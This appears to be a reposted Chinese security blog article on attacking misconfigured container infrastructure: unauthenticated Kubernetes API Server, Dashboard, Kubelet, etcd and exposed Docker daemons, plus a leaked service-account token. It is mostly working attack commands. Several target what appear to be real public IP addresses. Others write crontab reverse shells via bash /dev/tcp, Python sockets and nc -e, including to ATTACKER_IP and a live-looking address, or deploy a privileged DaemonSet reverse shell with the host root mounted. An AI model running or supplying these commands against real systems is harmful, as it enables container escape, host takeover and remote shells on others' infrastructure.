<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Btxkh01RailCHKbmPuPntw)

> 原文地址：https://misakikata.github.io/2022/03 / 云容器安全 /
> 
> 原文作者：mikaki

### 云容器安全初识

#### API Server 未授权访问

利用两个外部的环境：http://34.219.148.35:8080/、http://212.193.88.186:8080/

API Server 默认会开启两个端口：`8080` 和 `6443`。其中 8080 端口无需认证，应该仅用于测试。6443 端口需要认证，且有 TLS 保护。

```
kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous   //使6443 端口允许匿名用户<br style="visibility: visible;">
```

直接访问 8080 端口会返回可用的 API 列表，如：

```
{  "paths": [    "/api",    "/api/v1",    "/apis",    "/apis/extensions",    "/apis/extensions/v1beta1",    "/healthz",    "/healthz/ping",    "/logs/",    "/metrics",    "/resetMetrics",    "/swagger-ui/",    "/swaggerapi/",    "/ui/",    "/version"  ]}<br style="visibility: visible;">
```

而直接访问 6443 端口会提示无权限：`User “system:anonymous” cannot get at the cluster scope.

如果安装了 dashboard，访问 `/ui` 会跳转到 `dashboard` 页面，可以创建、修改、删除容器，查看日志等。

Kubernetes 官方提供了一个命令行工具 kubectl。

```
// 获得所有节点kubectl -s http://34.219.148.35:8080/ get nodes// 获得所有容器kubectl -s http://34.219.148.35:8080/ get pods --all-namespaces=true// 在 myapp 容器获得一个交互式 shellkubectl -s http://34.219.148.35:8080/ exec myapp --namespace=default -it -- bash
```

根据 Kubernetes 文档中挂载节点目录的例子，可以写一个 `myapp.yaml`，将节点的根目录挂载到容器的 `/mnt` 目录。

```
apiVersion: v1kind: Podmetadata:  name: myappspec:  containers:  - image: nginx    name: test-container    volumeMounts:    - mountPath: /mnt      name: test-volume  volumes:  - name: test-volume    hostPath:      path: /
```

然后使用 kubectl 创建容器：

```
// 由 myapp.yaml 创建容器kubectl -s http://34.219.148.35:8080/http://34.219.148.35:8080/ create -f myapp.yaml// 等待容器创建完成// 获得 myapp 的交互式 shellkubectl -s http://34.219.148.35:8080/ exec myapp --namespace=default -it -- bash// 向 crontab 写入反弹 shell 的定时任务echo -e "* * * * * root bash -i >& /dev/tcp/127.0.0.1/8888 0>&1\n" >> /mnt/etc/crontab// 也可以用 python 反弹 shellecho -e "* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" >> /mnt/etc/crontab
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4RckEJn5aAqrrUe10ofhHticKyMuDlduNKFGKsvJ3vyrFI3lF6LZjpZaFNUvWe1ND2znAiaQInQmiccQ/640?wx_fmt=png)image-20220311143128477

如果不需要反弹 shell，只需要在 docker 内执行命令的话

```
kubectl -s http://34.219.148.35:8080/ exec myapp -it -- ls /etc
```

以上使用的端口为 8080，如果需要使用 6443，则需要将”system:anonymous” 用户绑定到”cluster-admin” 用户组，从而使 6443 端口允许匿名用户以管理员权限向集群内部下发指令。

**使用 shodan 上的一个环境**，https://34.209.45.207:6443/。

查看 pods：

```
https://34.209.45.207:6443/api/v1/namespaces/default/pods?limit=500
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4RckEJn5aAqrrUe10ofhHticSMiccIQIh966f108BGM1zU2iaeeVXdJYrZNAREINNntmw5DjsGBV2ajQ/640?wx_fmt=png)image-20220311160028406

添加一个 pods

```
https://34.209.45.207:6443/api/v1/namespaces/default/pods
```

发送一段 json 数据

```
{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"test-4444\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"name\":\"test-4444\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]\}\}\n"},"name":"test-4444","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","name":"test-4444","volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"hostPath":{"path":"/","type":"Directory"},"name":"host"}]\}\}
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4RckEJn5aAqrrUe10ofhHticTT4XJhiaRvDK05thrLECgia2dJOOWqf2wbjBcw39fjjx4nxtkzZYXmGw/640?wx_fmt=png)image-20220311162415147

执行命令，

```
https://34.209.45.207:6443/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=whoami
```

提示错误，对于 websocket 连接，首先进行 http(s) 调用，然后是使用 HTTP Upgrade 标头对 websocket 的升级请求。

```
{  "kind": "Status",  "apiVersion": "v1",  "metadata": {  },  "status": "Failure",  "message": "Upgrade request required",  "reason": "BadRequest",  "code": 400}
```

利用 wscat，地址：https://github.com/websockets/wscat/archive/refs/tags/3.0.0.zip

较新的版本只支持 ws 开头的协议，这里换个老点的版本

```
./wscat -n -c "https://34.209.45.207:6443/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=id"
```

#### 利用 yaml 创建反弹 shell

前提需要容器逃逸，在控制节点上创建。

```
apiVersion: apps/v1kind: DaemonSetmetadata:  name: kube-cache-node1  namespace: kube-systemspec:  selector:    matchLabels:      app: kube-cache-node1  template:    metadata:      labels:        app: kube-cache-node1    spec:      hostNetwork: true      hostPID: true      containers:      - name: main        image: bash        imagePullPolicy: IfNotPresent        command: ["bash"]        # reverse shell        args: ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"]        securityContext:          privileged: true        volumeMounts:        - mountPath: /host          name: host-root      volumes:      - name: host-root        hostPath:          path: /          type: Directory
```

利用容器逃逸后的 shell 在目标控制节点上将上述内容保存为`kiit.yaml`并执行：

```
kubectl apply -f kiit.yaml
```

#### Docker Daemon 服务暴露至公网

Client 上使用命令后，会发送对应的请求到 API，也就是 Docker Daemon 服务。然后 docker 会去对应的 Registry 仓库拉取镜像创建容器。

这个服务本地会暴露在 unix:///var/run/docker.sock 上，如果容器中有权限访问到这个文件，就可以对宿主机的所有容器进行操作。

比如：http://68.183.144.186:2375/

直接访问，或者使用 docker 访问

```
docker -H tcp://68.183.144.186:2375 info
```

查看 docker 下的镜像

```
docker -H tcp://68.183.144.186:2375 images
```

创建容器，利用 bash 和 crontab 计划任务向宿主机写入 shell:

centos 系统挂载路径为 /var/spool/cron/root；ubuntu 系统为 / var/spool/cron/crontabs/root；

```
# 查看宿主机可用镜像docker -H tcp://68.183.144.186:2375 image# 启动刚刚创建的容器并连接docker -H tcp://51.195.28.76:2375 start ct_iddocker -H tcp://51.195.28.76:2375 exec -it --user root ct_id /bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4RckEJn5aAqrrUe10ofhHtic1PZmuJCm5IH8VRrJbUz44ibBV4ia3Hub4jzzScQjLsY9Fn3bCUzvRw8Q/640?wx_fmt=png)image-20220314143117085

使用镜像来创建一个容器

```
docker -H tcp://68.183.144.186:2375 run -it -v /var/spool/cron/:/var/spool/cron/ dcf4d4bef137 /bin/bash
```

启动成功后，自动进入了这个容器内

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4RckEJn5aAqrrUe10ofhHticuOposbOdFYtnT5x9JKwZQOrlnBGSDe0bHTsqt7icZfTCabmMxXE0enw/640?wx_fmt=png)image-20220314143537187

写入反弹 shell

```
root@177ac63fbb2f:/# echo '* * * * * bash -i >& /dev/tcp/158.247.216.146/8899 0>&1' >> /var/spool/cron/root
```

但是这个容器并没有启动，退出后会发现这个容器也停止了。需要先把这个容器启动运行。

```
docker -H tcp://68.183.144.186:2375 ps -adocker -H tcp://68.183.144.186:2375 start 8f351dbd41d7docker -H tcp://68.183.144.186:2375 exec -it --user root 8f351dbd41d7 /bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4RckEJn5aAqrrUe10ofhHticbhvwjO0ahMpT7Zqibl6JshQtjAsb4UDJiajKerSsLhFtvp2WbfuOVv6Q/640?wx_fmt=png)image-20220314151745747

或者使用 python 来执行，例如

```
import dockerclient = docker.DockerClient(base_url='http://192.168.11.160:2375/')data = client.containers.run('alpine:latest', r'''sh -c "echo '*/1 * * * * /usr/bin/nc 192.168.11.1 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'\}\})
```

#### Kubelet 10250 端口未授权访问

10250 端口是 kubelet API 的 HTTPS 端口，该端口对外提供了 Pod 和 Node 的相关信息，如果该端口对公网暴露，并且关闭授权，则可能导致攻击。

```
curl -k https://172.18.0.2:10250/run/{namespace}/{podName}/{appName} -d "cmd=whoami"或：curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://kube-node-here:10250/exec/<namespace>/<podname>/<container-name>?command=touch&command=hello_world&input=1&output=1&tty=1"
```

#### Kubernetes Dashboard 未授权访问

如果 Kubernetes API Server 配置了 Dashboard, 通过路径 / ui 即可访问，直接访问部署一个 docker 即可

```
apiVersion: v1kind: Podmetadata:  name: testspec:  containers:  - name: busybox    image: busybox:1.29.2    command: ["/bin/sh"]    args: ["-c", "nc attacker 4444 -e /bin/sh"]    volumeMounts:    - name: host      mountPath: /host  volumes:  - name: host    hostPath:      path: /      type: Directory
```

#### k8s serviceaccount token 泄露

由于 k8s 集群部署的时候默认会在每个`pod`容器中挂载 token 文件到`/run/secrets/kubernetes.io/serviceaccount/token`

我们可以通过命令行工具 `kubectl`来对`api-server`进行操作。

创建一个`k8s.yaml`配置文件，如下，token 处为我们上面拿到的 token，server 则填写 api-server 的地址

```
apiVersion: v1clusters:- cluster:    insecure-skip-tls-verify: true    server: https://10.247.0.1  name: cluster-namecontexts:- context:    cluster: cluster-name    namespace: test    user: admin  name: admincurrent-context: adminkind: Configpreferences: {}users:- name: admin  user:    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w
```

执行以下命令远程连接进入题目的 k8s 集群，成功通过认证。

```
kubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify=true
```

#### Etcd 未授权访问

其默认监听了 2379 等端口，如果 2379 端口暴露到公网，可能造成敏感信息泄露。

首先在 Kubernetes 中可以更改配置 / etc/Kubernetes/manifests/etcd.yaml 文件的内容，来将 2379 端口向外暴露

Etcd v2 和 v3 是两套不兼容的 API，K8s 是用的 v3，所以需要先通过环境变量设置 API 为 v3

```
export ETCDCTL_API=3
```

列出该目录所有节点的信息 http://152.7.98.135:2379/v2/keys

添加上 recursive=true 参数, 就会递归地列出所有的值 http://152.7.98.135:2379/v2/keys/?recursive=true

http://152.7.98.135:2379/v2/members 集群中各个成员的信息

安装 etcdctl，可以使用类似的方式查询 API

```
etcdctl --endpoint=http://[etcd_server_ip]:2379 ls
```

若存在路径 / registry/secrets/default，其中可能包含对集群提升权限的默认服务令牌。

参考文章：

https://xz.aliyun.com/t/4276 https://tttang.com/archive/1389/ https://www.freebuf.com/vuls/196993.html [https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/]

**免责声明**

由于传播、利用本公众号霜刃安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号霜刃安全及作者不为**此**承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读**

[POC bomber 利用大量高危害漏洞快速获取目标服务器权限](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247485285&idx=1&sn=53d6548f2432b2225450e598236931ce&chksm=c21a1bb7f56d92a19ddcbb5bbcd2e89abd494f79ce64ae061da70d34014ba816c3cb0d3fd874&scene=21#wechat_redirect)  

[零基础学 GO-GO 黑帽子学习笔记 - 2.3 端口扫描](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247485245&idx=1&sn=685abd24f13b0f045f8d37ebf1417b62&chksm=c21a1beff56d92f91f0afc51490a80c3eb3f9dbaf688d316b22f37f7a18304a178fbfe41a151&scene=21#wechat_redirect)  

[渗透测试 command 大全](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247485222&idx=1&sn=a7ff56bb14b64ffe4ac4452917aeb96e&chksm=c21a1bf4f56d92e298ee81fa357c69c360d11495b4a7a3d7318862be0d3fbed86d1573657603&scene=21#wechat_redirect)  

[WebSocket 内存马，一种新型内存马技术](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247484830&idx=1&sn=a1ae596433b485fb14bb4064e6c5c99b&chksm=c21a194cf56d905a135d6bab797c78caf0d93202dcfe2fc2e935bee677ac2ebf75ccea9eb660&scene=21#wechat_redirect)  

[GO 语言免杀器 Go_Bypass](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247484782&idx=1&sn=aaf8175efab0d03bd1fc5002034b7929&chksm=c21a19bcf56d90aaa648dd9831e1b733c1649328188cd4f0a78ae13f729b079df6dbb11a43ba&scene=21#wechat_redirect)